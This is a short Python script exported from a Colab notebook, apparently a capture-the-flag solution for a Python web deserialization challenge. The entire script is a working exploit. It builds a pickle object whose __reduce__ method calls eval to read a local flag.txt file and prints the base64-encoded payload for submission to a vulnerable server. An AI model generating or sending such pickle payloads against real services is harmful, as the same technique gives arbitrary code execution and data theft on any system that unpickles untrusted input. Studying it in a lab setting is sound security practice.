# -*- coding: utf-8 -*-
"""web-deserialize-python Script.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/18-qa0YWeU5X-P9x1ZzQJdXDmKljUN78B
"""

import pickle, base64

class test:
    def __reduce__(self):
        p="open('./flag.txt').read()"
        return (eval,(p,))

rs={'name':test()}

print(base64.b64encode(pickle.dumps(rs)).decode('utf8'))